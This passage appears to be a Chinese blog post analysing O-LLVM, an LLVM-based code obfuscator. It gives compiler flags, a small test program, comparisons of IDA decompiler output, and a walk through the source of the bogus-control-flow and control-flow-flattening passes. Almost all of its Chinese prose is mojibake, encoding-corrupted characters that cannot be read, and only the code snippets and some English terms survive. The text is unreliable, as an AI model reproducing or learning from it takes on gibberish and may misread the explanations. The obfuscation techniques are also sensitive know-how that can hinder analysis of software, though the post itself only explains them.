æ­¤è¿‡ç¨‹çš„ç›®çš„æ˜¯å®Œå…¨å¼„å¹³ç¨‹åºçš„æ§åˆ¶æµç¨‹å›¾ã€‚ç®€å•æ¥è¯´å°±æ˜¯æ‹†åˆ†åŸºæœ¬å—å¹¶ç½®äºæ— é™å¾ªç¯ä¸­ï¼Œç¨‹åºæµç¨‹ç”±switchæ§åˆ¶\nå¯ç”¨çš„ç¼–è¯‘å™¨é€‰é¡¹ï¼š\n -mllvm -flaï¼šæ¿€æ´»æ§åˆ¶æµå±•å¹³ -mllvm -splitï¼šæ¿€æ´»åŸºæœ¬å—åˆ†å‰²ã€‚ä¸€èµ·ä½¿ç”¨å¯æ”¹å–„å±•å¹³æ€§ã€‚ -mllvm -split_num=3ï¼šå¦‚æœæ¿€æ´»äº†é€šè¡Œè¯ï¼Œåˆ™åœ¨æ¯ä¸ªåŸºæœ¬å—ä¸Šåº”ç”¨3æ¬¡ã€‚é»˜è®¤å€¼ï¼š1  Functions annotations æ³¨é‡Šä½¿æ‚¨å¯ä»¥æŒ‰åŠŸèƒ½æŒ‡å®šè¦åº”ç”¨ï¼ˆæˆ–ä¸åº”ç”¨ï¼‰æ··æ·†çš„åŠŸèƒ½\nç”¨æ³•ï¼šåªéœ€å‘æ‚¨çš„å‡½æ•°æ·»åŠ å±æ€§ã€‚\nä¾‹å¦‚ï¼š\n1 2 3 4  int foo() __attribute((__annotate__((\"fla\")))); int foo() { return 2; }   æ‚¨å¯ä»¥ä¸ºæ¯ä¸ªåŠŸèƒ½æ·»åŠ ä½¿ç”¨ä¸€ä¸ªæˆ–å¤šä¸ªæ³¨é‡Šã€‚å¦‚æœè¦ç¦ç”¨åŠŸèƒ½çš„æ··æ·†ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨â€œåå‘æ ‡å¿—â€ï¼ˆä¾‹å¦‚ï¼Œå¦‚æœè¦ç¦ç”¨åŠŸèƒ½çš„ä¼ªé€ æ§åˆ¶æµï¼Œè¯·ä½¿ç”¨æ³¨é‡Šâ€œ nobcfâ€ï¼‰ã€‚\nå¯¹æ¯” æˆ‘è‡ªå·±å†™äº†ä¸€ä¸ªæµ‹è¯•æ–‡ä»¶ï¼Œç„¶åç”¨äºclangå’Œollvmæ··æ·†çš„å„ç§æµ‹è¯•\næºä»£ç å¦‚ä¸‹ï¼Œå…³äºæ··æ·†ä¹‹åçš„æ‰§è¡Œæ–‡ä»¶å’Œæºæ–‡ä»¶æ‰“åŒ…åœ¨äº†here\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e int main(){ printf(\"Hello LLVM\"); char *a= \"Hello fucking bug\"; //a = \"Hello O-LLVM!I will fuck you!\"; \tint sum = 0; for (int i = 1;i\u003c=10;i++){ sum += i; } printf(\"%s\\nthe answer of what i do is %d\\n\",a,sum); printf(\"test finished!\\n\"); return 0; }   ä»¥ä¸‹æ˜¯gccç¼–è¯‘çš„æ–‡ä»¶é€šè¿‡idaé€†å‘æ‰€å¾—çš„æµç¨‹å›¾\nä»¥ä¸‹æ˜¯ç”¨clang9.0 ç¼–è¯‘testçš„æµç¨‹å›¾ï¼Œå¯è§å¤§ä½“çš„æµç¨‹æ˜¯å’Œgccç›¸åŒçš„ï¼Œä¸è¿‡é€šè¿‡idaçš„ä¸‡èƒ½F5åç¼–è¯‘å‡ºæ¥çš„æºç ï¼Œclangç‰ˆæœ¬çš„åŸºæœ¬å’Œæºç å·®ä¸å¤šï¼Œgccç‰ˆæœ¬çš„å¾ªç¯çš„å˜é‡æŒºå¥‡æ€ªçš„ï¼Œä½†æ˜¯æ€»ä½“æµç¨‹è¿˜æ˜¯ä¸å˜çš„\nä¸‹å›¾æ˜¯åŠ äº†ollvmçš„bcfé€‰é¡¹çš„åæ±‡ç¼–ç»“æœï¼Œå¯è§æ·»åŠ äº†è®¸å¤šè™šå‡æ§åˆ¶æµï¼ŒçœŸæ­£æ‰§è¡Œçš„å¾ªç¯æ˜¯å·¦åŠéƒ¨åˆ†ï¼Œä»–æŠŠforå¾ªç¯ç»“æŸä¹‹åçš„è¯¥æ‰§è¡Œçš„è¯­å¥æ”¾åˆ°äº†å³åŠéƒ¨åˆ†ï¼Œåœ¨æ·»åŠ è™šå‡æ§åˆ¶æµ\nçœ‹åæ±‡ç¼–çš„ä»£ç ï¼Œä»–æŠŠforå¾ªç¯æ”¾å…¥äº†ä¸€ä¸ªwhileå¾ªç¯é‡Œï¼Œç„¶åç”¨ä¸€ä¸ªifæ§åˆ¶æ˜¯å¦ç»“æŸåŸæ¥çš„å¾ªç¯ï¼ŒåŠ å…¥ç»“æŸï¼Œå°±ç”¨gotoåˆ°è¾¾æœ€åæ‰§è¡Œçš„è¯­å¥é‡Œï¼Œè¿™é‡Œåˆå†™äº†ä¸€ä¸ªå‡çš„whileï¼Œç»æˆ‘çœ‹ä¸‹æ¥ï¼Œè¿™ä¸ªwhileä¹Ÿå°±æ‰§è¡Œä¸€æ¬¡ï¼Œå¾ªç¯å°±é€€å‡ºäº†ï¼Œæœç„¶æ··æ·†åæƒ³ææ‡‚æµç¨‹è´¼éº»çƒ¦\nollvmç¼–è¯‘flaé€‰é¡¹ï¼Œç”±äºé€‚é…llvm9.0çš„flaé€‰é¡¹å¤±è´¥äº†ï¼Œæ‰€ä»¥è¿™è¾¹æ˜¯å¼•ç”¨-splité€‰é¡¹å¾—å‡ºæ¥çš„åæ±‡ç¼–ç»“æœï¼Œsplitä¹Ÿå°±æ˜¯flaå¹³å¦åŒ–æ‰€é€‰æ‹©çš„é€‰é¡¹\nå¯¹æ¯”åŸæ¥çš„clangåæ±‡ç¼–å‡ºæ¥çš„ç»“æœæ˜¯ä¸æ˜¯å¤šäº†è®¸å¤šå¯ä¾›é€‰æ‹©çš„è·¯ï¼Œæ­£å¦‚wikiæ‰€è¯´æ˜¯ç”¨switchæ§åˆ¶çš„\nåæ±‡ç¼–å‡ºæ¥çš„ä»£ç åµŒå¥—äº†å¤šå±‚whileå¾ªç¯ï¼Œå¹¶åŠ å…¥ifåˆ¤æ–­ï¼Œä½å±‚åº”è¯¥å°±æ˜¯ç”¨switchå®ç°çš„ï¼Œç„¶åå†æŸå‡ ä¸ªswitch caseåŠ å…¥breakç ´åå¾ªç¯è¾¾åˆ°æ§åˆ¶æµç¨‹çš„ç›®çš„\nè¿™ä¸ªæ˜¯æœ€ç®€å•çš„ï¼Œå’Œclangç¼–è¯‘çš„ç‰ˆæœ¬å¯¹æ¯”ï¼Œä¸»è¦åŒºåˆ«åœ¨äºåˆ†å—ä¹‹åçš„å·¦è¾¹çš„å—ï¼Œä»–æŠŠå…¶æŒ‡ä»¤è¿›è¡Œäº†æ›¿æ¢ï¼Œå…·ä½“å’‹æ›¿æ¢çœ‹æˆ‘åé¢çš„æºç åˆ†æ\nä¸è¿‡å¯æƒœçš„æ˜¯ï¼Œè¿™ä¸ªä»£ç æ›¿æ¢å¯¹äºidaæ¥è¯´å¥½åƒä¸æ˜¯ä»€ä¹ˆå¤§äº‹æƒ…ï¼Œåˆ©ç”¨ä¸‡èƒ½çš„F5åæ±‡ç¼–æ—¶ï¼Œä»–æˆåŠŸæŠŠå¾ªç¯é‡Œçš„åŠ æ³•è¿˜åŸäº†ï¼Œäº§ç”Ÿçš„ä»£ç å’Œclangç‰ˆæœ¬æ²¡æ··æ·†çš„ä¸€æ¨¡ä¸€æ ·\nå¯èƒ½è¿™éœ€è¦å’Œå…¶ä»–å‡ ä¸ªé€‰é¡¹ä¸€èµ·ä½¿ç”¨ä¼šæ¯”è¾ƒå¥½\n//TODOï¼šå­—ç¬¦ä¸²æ··æ·†\no-llvmæºç åˆ†æ é€šè¿‡æˆ‘ä»¬æ‰‹åŠ¨å°†ollvmä¸llvm9.0æ‰“åŒ…çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥éå¸¸æ¸…æ¥šåœ°äº†è§£äº†ollvmçš„æºç ç»“æ„\n1 2 3 4 5 6 7  ./include/llvm/Transforms/Obfuscation/ # obfuscationçš„å¤´æ–‡ä»¶ ./include/llvm/Transforms/CryptoUtils.h # obfuscationçš„åŠ å¯†å·¥å…·ç±»çš„å¤´æ–‡ä»¶ ./lib/Transforms/IPO/LLVMBuild.txt # passæ¨¡å—ç¼–è¯‘çš„æ¨¡å—æ³¨å†Œ ./lib/Transforms/IPO/PassManagerBuilder.cpp # Passæ³¨å†Œ ./lib/Transforms/Obfuscation/ # obfuscation source code ./lib/Transforms/CMakeLists.txt # åŠ å…¥å­ç›®å½• ./lib/Transforms/LLVMBuild.txt # åŠ å…¥LLVMç¼–è¯‘å­ç›®å½•   æˆ‘ä»¬çŸ¥é“ï¼Œollvmå°±æ˜¯é€šè¿‡ç¼–å†™llvmçš„passæ¥å°†å…¶ä¸­é—´è¯­è¨€IRè¿›è¡Œä¸åŒç¨‹åº¦çš„æ··æ·†\nBogus Control Flow Bogus Control Flowçš„åŠŸèƒ½æ˜¯ä¸ºå‡½æ•°å¢åŠ æ–°çš„è™šå‡æ§åˆ¶æµå’Œæ·»åŠ åƒåœ¾æŒ‡ä»¤ã€‚\nå…¶ä¸­æ–‡ä»¶ä½äº./include/llvm/Transforms/Obfuscation/BogusControlFlow.cpp\nå…¶ä¸­çš„æ³¨é‡Šè·Ÿæˆ‘ä»¬éå¸¸å½¢è±¡çš„æ¼”ç¤ºäº†å…¶çš„å·¥ä½œå†…å®¹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  // This file implements BogusControlFlow's pass, inserting bogus control flow. // It adds bogus flow to a given basic block this way: // // Before : // entry // | // ______v______ // | Original | // |_____________| // | // v //\treturn // // After : // entry // | // ____v_____ // |condition*| (false) // |__________|----+ // (true)| | // | | // ______v______ | // +--\u003e| Original* | | // | |_____________| (true) // | (false)| !-----------\u003e return // | ______v______ | // | | Altered |\u003c--! // | |_____________| // |__________| //   ä»–çš„Cppæ–‡ä»¶å…ˆå†™å¥½äº†Debugä¿¡æ¯ï¼Œå†å®šä¹‰äº†ä»¥ä¸‹ä¸ºpassæä¾›çš„é€‰é¡¹å¸¸é‡\nå…¶ä¸­ï¼Œæˆ‘ä»¬æœ€å¸¸è§çš„ cl::opt\u003cdata_type\u003eæ˜¯ç”¨æ¥ä¼ é€’llvmä¹‹é—´passå…±äº«çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨ç¼–è¯‘æ—¶æ‰€ç»™çš„-bcf_prob = 50è¿™ä¸ªå‘½ä»¤è¡Œç¼–è¯‘å‚æ•°å¯ä»¥ä¼ é€’åˆ°passçš„æ ¸å¿ƒæ‰€åœ¨\ncl::optè¿™ä¸ªç”¨æ³•è®©æˆ‘æƒ³èµ·äº†c++ä¸­std::coutã€using namespace stdï¼Œç»æŸ¥è¯¢å‘ç°ï¼Œè¿™æ˜¯ä¸€ä¸ªç±»ä¼¼äºpythonçš„importçš„ä¸€ä¸ªè¯­æ³•ï¼Œnamespaceæ˜¯ä¸ºäº†å’Œcçš„.håŒºåˆ†å¼€æ¥\n è¯¦ç»†å¯è§ï¼š\nC++ Namespace è¯¦è§£\nC++ å‘½åç©ºé—´\nC++/C++11ä¸­å‘½åç©ºé—´(namespace)çš„ä½¿ç”¨ï¼šè¿™é‡Œé¢æœ‰ä¸€æ®µæŠ˜ç£¨äººçš„ä»£ç ï¼Œè¯»æ‡‚äº†åº”è¯¥å°±æ‡‚äº†c++çš„namespaceçš„ä½œç”¨åŸŸ\n ç›®å‰è¯»ä¸‹æ¥ï¼Œæœ€å¸¸è§çš„åº”è¯¥å°±æ˜¯namespace llvmå’Œ namespace cläº†\n1  struct BogusControlFlow : public FunctionPass   è¿™é‡Œï¼ŒBogusControlFlowç»§æ‰¿è‡³FunctionPassï¼Œå› æ­¤å®ƒçš„å…¥å£å‡½æ•°å³ä¸ºrunOnFunction\n structçš„ç»§æ‰¿å’Œclassçš„ç»§æ‰¿æœ‰å¾ˆå¤§çš„åŒºåˆ«ï¼Œstructçš„ç»§æ‰¿æ˜¯åŸºäºå­ç±»(struct)çš„publicç»§æ‰¿ï¼Œclassæ˜¯åŸºäºå­ç±»(class)çš„privateç»§æ‰¿\n æ•´ä¸ªnamespaceå†™äº†ä¸€ä¸ªstruct ç±»ç”¨äºæ··æ·†\nå…¶ä¸­runOnFunctionä¸ºå…¥å£å‡½æ•°ï¼Œå…ˆåˆ¤æ–­bcfçš„ä¸¤ä¸ªå‚æ•°-bcf_loopå’Œ-bcf_probæ˜¯å¦ç¬¦åˆæ­£ç¡®èŒƒå›´å†…ï¼Œç„¶åæ£€æŸ¥æ˜¯å¦å¯ç”¨äº†-bcfé€‰é¡¹ï¼Œå‡å¦‚å¯ç”¨äº†ï¼Œåˆ™è¿›å…¥æ ¸å¿ƒå‡½æ•°bogus(F);ï¼Œç„¶åç»§ç»­å¤„ç†doF(*F.getParent());\nåœ¨bogus()å‡½æ•°é‡Œï¼Œå…ˆå®ç°äº†Debugçš„ç›¸å…³éƒ¨åˆ†ï¼Œåœ¨æ¯æ¬¡è¿›å…¥å‡½æ•°å‰è¾“å‡ºdebugä¿¡æ¯ï¼Œç”¨äºå¤„ç†debugæ¨¡å¼ä¸‹çš„-bcfé€‰é¡¹ã€‚ç„¶åå®šä¹‰ä¸€ä¸ªlisté“¾è¡¨ï¼Œç”¨äºå‚¨å­˜BasicBlockï¼ŒBasicBlockç”¨forå¾ªç¯åˆ©ç”¨è¿­ä»£å™¨çš„æ¨¡å¼ä»ä¼ å…¥çš„ F è·å–ã€‚ä¸€ä¸ªwhileå¾ªç¯ï¼Œå½“åŸºæœ¬å—éç©ºæ—¶ï¼Œåˆ©ç”¨cryptoutilså·¥å…·ç±»è·å–éšæœºæ•°ï¼Œä»é“¾è¡¨ä¸­é€‰æ‹©åŸºæœ¬å—è¿›è¡Œæ··æ·†(ç”¨addBogusFlow(basicBlock, F);å‡½æ•°)ï¼Œå¹¶æ ‡è®°å·²æ··æ·†è¿‡è¯¥å—ï¼Œé˜²æ­¢é‡å¤æ··æ·†æŸä¸€åŸºæœ¬å—ï¼Œå¦åˆ™å°±ä¸æ··æ·†ã€‚ç„¶åå¼¹å‡ºé“¾è¡¨ä¸­çš„ç¬¬ä¸€å—ï¼Œè¿™æ ·ç›´åˆ°æ··æ·†æ¬¡æ•°ä¸º0ä¸ºæ­¢ã€‚\naddBogusFlow()å‡½æ•°ï¼Œå°†ç»™å®šçš„åŸºæœ¬å—è¿›è¡Œæ·»åŠ è™šå‡æ§åˆ¶æµã€‚é¦–å…ˆè·å¾—ä¸€ä¸ªåŸºæœ¬å—Basic Blockï¼Œåˆ©ç”¨createAlteredBasicBlock()å‡½æ•°ç”Ÿæˆä¸€ä¸ªä¸åŸåŸºæœ¬å—ç›¸ä¼¼çš„Basci Blockï¼Œç„¶ååˆ©ç”¨BasicBlock-\u003egetTerminator()-\u003eeraseFromParent();æŠŠä»–ä»¬çš„çˆ¶æ¯èŠ‚ç‚¹æ“¦é™¤ï¼Œç„¶ååˆ›å»ºä¸¤ä¸ªæ¡ä»¶æ’ä¸ºçœŸçš„å·¦å³å­èŠ‚ç‚¹ï¼Œç„¶åå°†å…¶åˆ›å»ºåˆ†æ”¯å¾ªç¯ã€‚ï¼ˆå…¶è¿‡ç¨‹æ˜¯åˆ›å»ºä¸€ä¸ªæ’çœŸçš„åˆ†æ”¯ï¼Œè¿›å…¥åˆ†æ”¯çš„åŸºæœ¬å—åï¼ŒåŠ å…¥ä¸€ä¸ªåˆ¤æ–­ï¼Œè‹¥çœŸè¿›å…¥åŸåŸºæœ¬å—ï¼Œè‹¥å‡è¿›å…¥å‡åŸºæœ¬å—ï¼Œç»å‡åŸºæœ¬å—çš„åƒåœ¾ä»£ç ä¹‹åï¼Œå†è¿›å…¥åŸåŸºæœ¬å—ã€‚åœ¨ä¸ºçœŸæ—¶ï¼Œè¿›å…¥åŸåŸºæœ¬å—ï¼Œå°†åŸºæœ¬å—ä¸»ä½“æ‰§è¡Œå®Œä¹‹åï¼Œåœ¨åŠ å…¥åˆ†æ”¯åˆ¤æ–­ï¼Œæ­£ç¡®è¿”å›ç»“æœï¼Œé”™è¯¯è·³è½¬è‡³æ··å‡åŸºæœ¬å—è¿›è¡Œå¾ªç¯ï¼‰\n https://sq.163yun.com/blog/article/175307579596922880ï¼šè¿™ä¸ªè®²çš„ç‰¹åˆ«å½¢è±¡ï¼Œé…åˆç€å›¾ä¸€èµ·é˜…è¯»ï¼Œè¿™è¾¹å€Ÿç”¨å…¶ä¸€å¼ å›¾\n 1 2 3  int add(int a, int b){ return a+b; }   å¦‚å›¾ï¼Œå¯¹äºä¸Šè¿°å‡½æ•°ï¼Œåˆ†ç¦»å…¶åŸºæœ¬å—ï¼Œåˆ›å»ºä¸€ä¸ªå…¥å£entryï¼Œç„¶ååŠ å…¥ä¸€ä¸ªæ’çœŸçš„åˆ†æ”¯ï¼ŒæŠŠç”Ÿæˆç›¸ä¼¼çš„åŸºæœ¬å—æ”¾è‡³é”™è¯¯åˆ†æ”¯é‡Œï¼Œå³å…¶æ°¸è¿œä¸ä¼šæ‰§è¡Œçš„åƒåœ¾ä»£ç ï¼Œå°†æ‰€æ‰§è¡Œçš„åŸºæœ¬å—æ”¾å…¥æ­£ç¡®åˆ†æ”¯é‡Œ\ncreateAlteredBasicBlock()å‡½æ•°ç”¨äºç”Ÿæˆä¸ç»™å®šåŸºæœ¬å—ç›¸ä¼¼çš„åŸºæœ¬å—ï¼Œå°†æ“ä½œè¿ç®—ç¬¦è¿›è¡Œé‡æ–°æ˜ å°„ï¼Œé‡æ–°æ˜ å°„èŠ‚ç‚¹ï¼Œé‡æ–°æ˜ å°„å¯¹åº”çš„æ•°æ®ï¼Œç„¶ååŠ å…¥éšæœºçš„æŒ‡ä»¤\nå¯¹äºdoF()å‡½æ•°ï¼Œè¯¥å‡½æ•°çš„åŠŸèƒ½æ˜¯å°†Functionä¸­æ‰€æœ‰ä¸ºçœŸçš„åˆ¤æ–­è¯­å¥è¿›è¡Œæ›¿æ¢ï¼Œæ¯”å¦‚ä¹‹å‰çš„1.0 == 1.0 ã€‚å®ƒçš„æ€æƒ³æ˜¯å®šä¹‰ä¸¤ä¸ªå…¨å±€å˜é‡xã€yå¹¶ä¸”åˆå§‹åŒ–ä¸º0ï¼Œç„¶åéå†Moduleå†…çš„æ‰€æœ‰æŒ‡ä»¤ï¼Œå¹¶å°†æ‰€æœ‰çš„FCMP_TRUEåˆ†æ”¯æŒ‡ä»¤æ›¿æ¢ä¸ºy\u003c10 || x*x(x-1)%2 ==0ï¼Œæˆ‘ä»¬ä»åæ±‡ç¼–çš„ä»£ç æ¥çœ‹ï¼Œå¾ˆæ˜æ˜¾çš„å°±æœ‰y\u003c10è¿™ä¸ªåˆ†æ”¯\nFlattening Flatteningçš„ä¸»è¦åŠŸèƒ½æ˜¯ä¸ºå‡½æ•°å¢åŠ switch-caseè¯­å¥ï¼Œä½¿å¾—å‡½æ•°å˜å¾—æ‰å¹³åŒ–ã€‚ä¸‹é¢å°±å¯¹å®ƒçš„å®ç°æºç è¿›è¡Œåˆ†æã€‚\nå…¶ä¸­æ–‡ä»¶ä½äº./include/llvm/Transforms/Obfuscation/Flattening.cpp\nFlatteningç»§æ‰¿äº†FunctionPassï¼Œå› æ­¤å®ƒçš„å…¥å£å‡½æ•°å³ä¸ºrunOnFunctionã€‚åœ¨runOnFunctionå‡½æ•°çš„å…·ä½“å®ç°ä¸­ï¼Œé¦–å…ˆåˆ¤æ–­æ˜¯å¦åŒ…å«äº†å¯åŠ¨-flaçš„å‘½ä»¤ã€‚åœ¨ç¼–è¯‘ç›®æ ‡ç¨‹åºä»£ç æ—¶ï¼Œå¦‚è¦å¯åŠ¨flaæ¨¡å—ï¼Œéœ€è¦å¸¦ä¸Šå‚æ•°-mllvm -flaã€‚\nå‚æ•°æ£€æŸ¥å®Œæ¯•ä¹‹åï¼Œè°ƒç”¨flattenå‡½æ•°ã€‚flattenå‡½æ•°æ˜¯è¯¥Passçš„æ ¸å¿ƒï¼Œä¸‹é¢å¯¹è¯¥å‡½æ•°è¿›è¡Œåˆ†æã€‚\nå…ˆæ˜¯å£°æ˜äº†ä¸€äº›åé¢è¦ç”¨çš„å˜é‡ï¼Œç„¶ååˆ›å»ºäº†ä¸€ä¸ªæ•°ç»„ï¼Œç”¨æ¥å­˜å‚¨éšæœºæ•°ç§å­\n1 2 3 4 5 6 7  // SCRAMBLER  char scrambling_key[16]; llvm::cryptoutils-\u003eget_bytes(scrambling_key, 16); // END OF SCRAMBLER // Lower switch  FunctionPass *lower = createLowerSwitchPass(); lower-\u003erunOnFunction(*f);   åä¸¤è¡Œè°ƒç”¨äº†å¤–éƒ¨ä¸€ä¸ªå¤–éƒ¨passï¼šcreatLowerSwitchPass()ï¼Œç”¨æ¥æ¶ˆé™¤å½“å‰å‡½æ•°çš„å†…éƒ¨ç”¨switchæ–¹å¼çš„ä»£ç ï¼Œå°†å…¶å…¨è½¬æ¢æˆif elseçš„è°ƒç”¨ï¼Œæ–¹ä¾¿åé¢çš„ä»£ç å—åˆ†å‰²\nç„¶åä¸€ä¸ªforå¾ªç¯ï¼Œåƒbcfé‚£æ ·ï¼Œå°†å‡½æ•°åˆ†ä¸ºå„ä¸ªåŸºæœ¬å—å‚¨å­˜åœ¨vector\u003cBasicBlock *\u003e origBBçš„ä¸€ä¸ªå‘é‡æ•°ç»„é‡Œï¼Œç­‰ç­‰çš„ä»£ç æ˜¯é’ˆå¯¹åŸºæœ¬å—çš„æ“ä½œï¼Œå°±åƒä¹é«˜é‚£æ ·ä¸€å—å—è¿›è¡Œæ‹¼æ¥ã€‚\nç„¶åçš„è¯ï¼Œè‹¥åªæœ‰ä¸€ä¸ªä»¥ä¸‹çš„åŸºæœ¬å—ï¼Œé‚£ä¹ˆæ— æ³•å¹³å¦åŒ–ï¼Œç›´æ¥è¿”å›false\nç„¶åå¼€å§‹éå†åŸºæœ¬å—ï¼Œå…ˆæŠŠç¬¬ä¸€å—ä»vectoræ•°ç»„ä¸­ç§»é™¤ï¼Œå› ä¸ºæŒ‰ç…§ä»–çš„æµç¨‹å¹³å¦åŒ–çš„è®¾è®¡ï¼Œç¬¬ä¸€å—è¿›è¡Œå•ç‹¬å¤„ç†ï¼Œä½œä¸ºæ•´ä¸ªæ··æ·†æµç¨‹çš„å¼€å§‹é€»è¾‘ï¼Œæ‰€ä»¥ç´§æ¥ç€å…ˆå¯¹ç¬¬ä¸€å—è¿›è¡Œå¤„ç†ã€‚\næ£€æŸ¥ç¬¬ä¸€å—ä¸­æ˜¯å¦åŒ…å«æ¡ä»¶è·³è½¬åˆ†æ”¯ï¼Œå¦‚æœåŒ…å«æ¡ä»¶è·³è½¬åˆ†æ”¯ï¼Œåˆ™æŒ‰ç…§æ¡ä»¶åˆ†æ”¯çš„ä½ç½®è¿›è¡Œä»£ç å—åˆ†å‰²ï¼Œåˆ†å‰²é€»è¾‘è·ŸSplitBasicBlockçš„é€»è¾‘ä¸€è‡´ï¼Œæ•´ä¸ªåˆ†å‰²çš„ç›®çš„ä¹Ÿæ˜¯ä¸ºäº†åé¢è¿›è¡Œæµç¨‹å¹³å¦åŒ–å‡†å¤‡çš„\nç„¶åå¼€å§‹æ˜¯æ ¸å¿ƒä»£ç äº†\n1 2 3 4 5 6 7  // Create switch variable and set as it  switchVar = new AllocaInst(Type::getInt32Ty(f-\u003egetContext()), 0, \"switchVar\", insert); new StoreInst( ConstantInt::get(Type::getInt32Ty(f-\u003egetContext()), llvm::cryptoutils-\u003escramble32(0, scrambling_key)), switchVar, insert);   è¿™ä¸€æ®µåˆ›å»ºäº†ä¸€ä¸ªswitchç”¨çš„å˜é‡ï¼Œç›¸å½“äºæ˜¯switch(caseVar)ï¼Œå¹¶é€šè¿‡StoreInstè¿›è¡Œèµ‹å€¼ï¼Œè¿™æ—¶å°±ç”¨ä¸Šäº†ä¹‹å‰çš„éšæœºæ•°ç§å­ï¼Œå°†ç”Ÿæˆçš„éšæœºæ•°ç”¨ä½œcaseã€‚\næ¥ç€åˆ›å»ºäº†ä¸¤ä¸ªç©ºçš„åŸºæœ¬å—loopEntryå’ŒloopEndï¼Œç„¶åå°†switchè¯­å¥æ”¾å…¥loopEntryä¸­ï¼Œå°†ç¬¬ä¸€å—åŸºæœ¬å—è¿æ¥ä¸ŠloopEntryï¼ŒloopEndè·³è½¬å›loopEntryï¼Œåœ¨switchè¯­å¥åŠ å…¥é»˜è®¤çš„swDefaultåŸºæœ¬å—å¤§æ¦‚æˆå‹äº†\nå¤§æ¦‚å°±å’Œä¸‹é¢è¿™ä¸ªæµç¨‹å›¾å·®ä¸å¤šäº†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  //\t+--------+ // |first bb| // +---+----+ // | // +----v----+ // |loopEntry| \u003c--------+ // +----+----+ | // | | // +----v---+ | // | switch | | // +----+---+ | // | | // +------------+ | // | | //\t+------v-------+ | //\t| default case | | //\t+------+-------+ | // | | // +-----------+ | // | | // | | // v | // +-----+------+ | // | loopEnd +---------+ // +------------+   éª¨æ¶æˆå‹äº†ï¼Œæ¥ä¸‹æ¥æŠŠå‰©ä½™çš„åŸºæœ¬å—å¾€switchè¯­å¥ä¸­å¡«å…¥å°±è¡Œäº†ã€‚\nä½†æ˜¯å¡«å…¥ä¹‹åè‚¯å®šæ˜¯ä¸ªæ­»å¾ªç¯äº†ï¼Œæˆ‘ä»¬è¿™æ—¶å€™å°±è¦æ´»ç”¨flattençš„æ€æƒ³ï¼Œæ§åˆ¶switch caseçš„caseVarçš„å€¼æ¥è¾¾åˆ°æ§åˆ¶æµç¨‹çš„ç›®çš„â€”â€”å¾ˆç®€å•ï¼Œåœ¨æ¯ä¸ªåŸºæœ¬å—å³æ¯ä¸ªcaseä¹‹åï¼Œè¡¥ä¸Šä¸€æ¡å¯¹caseVarçš„å€¼æ›´æ–°çš„è¯­å¥å³å¯è¾¾åˆ°æ§åˆ¶æµç¨‹çš„ç›®çš„\nå‰©ä¸‹ä»£ç å°±æ˜¯æ¥æ›´æ–°æ¯ä¸ªcaseä¸­ä»£ç å—å¯¹caseVarçš„æ“ä½œäº†ï¼Œæ€ä¹ˆæ›´æ–°å‘¢ï¼Œå¾ˆç®€å•ï¼Œå°±æ˜¯æ›´æ–°æˆå½“å‰ä»£ç å—åŸåç»­é€»è¾‘å—åœ¨å½“å‰è¿™ä¸ªä»£ç æ¡†æ¶ä¸‹çš„caseå€¼\næ¥ä¸‹æ¥çš„æ“ä½œåˆ†ä¸‰ç§æƒ…å†µæ¥è¿›è¡Œ\n  caseä¸­ä»£ç å—æ²¡æœ‰åç»­å—ï¼Œé‚£å°±æ˜¯ä¸€ä¸ªè¿”å›å—ï¼Œä¸éœ€è¦æ›´æ–°caseVar\n  caseä¸­ä»£ç å—åªæœ‰ä¸€ä¸ªåç»­å—ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªæ— æ¡ä»¶è·³è½¬åˆ†æ”¯ï¼Œç›´æ¥æ›´æ–°æˆåç»­å—å¯¹åº”çš„caseå³å¯\n  caseä¸­ä»£ç å—æœ‰2ä¸ªåç»­å—ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªæ¡ä»¶è·³è½¬åˆ†æ”¯ï¼Œé€šè¿‡successorå¯¹è±¡ï¼ˆå°±æ˜¯åç»­å—çš„æ„æ€ï¼‰ç›´æ¥åœ¨switchç»“æ„ä¸­æŸ¥æ‰¾å‡ºå¯¹åº”çš„caseå€¼\n1  SelectInst *sel =SelectInst::Create(br-\u003egetCondition(), numCaseTrue, numCaseFalse, \"\",i-\u003egetTerminator());   å¦‚ä¸Šï¼Œä½¿ç”¨llvmçš„SelectInstæ¥å®ç°åˆ†æ”¯é€‰æ‹©ï¼Œåƒ227è¡Œå†™çš„ï¼Œæ ¹æ®br-\u003egetCondition()æ˜¯å¦ä¸ºTrueæ¥å†³å®šæ˜¯è·³è½¬åˆ°numCaseTrueè¿˜æ˜¯numCaseFalse\n  æœ€åè¿™æ ·å°±æˆåŠŸå¹³å¦åŒ–æˆåŠŸäº†\næ‹¿ä¸€ä¸ªä¾‹å­æ¥ç†è§£ï¼š\n1 2 3 4 5 6 7 8 9 10 11  int func1(int a,int b) { int result; if(a\u003e0){ result=a+b; } else{ result=a-b; } return result; }   å¦‚ä¸‹å›¾ï¼Œè¿™æ˜¯åŸæœ¬ä¸Šé¢è¿™ä¸ªå‡½æ•°çš„IRå›¾\nå…ˆåˆ¤æ–­ç¬¬ä¸€ä¸ªåŸºæœ¬å—æœ‰æ²¡æœ‰ifè¯­å¥ï¼Œæˆ‘ä»¬è¿™ä¸ªå‡½æ•°åˆšå¼€å§‹æ˜æ˜¾æ²¡æœ‰ï¼Œå…ˆå°†ç¬¬ä¸€å—åˆ†å¼€æˆä¸€ä¸ªåŸºæœ¬å—\nç„¶ååˆ›å»ºä¸‰ä¸ªåŸºæœ¬å—loopEntryã€loopEndã€swDefaultï¼Œç»„æˆå¦‚ä¸‹å›¾å·¦è¾¹çš„æµç¨‹\nè¿™æ—¶å€™ï¼Œswitchè¯­å¥æˆ‘ä»¬å·²ç»å¯ä»¥çœ‹è§äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å°†vectoré‡Œå­˜å‚¨çš„æ¯ä¸ªåŸºæœ¬å—åŠ 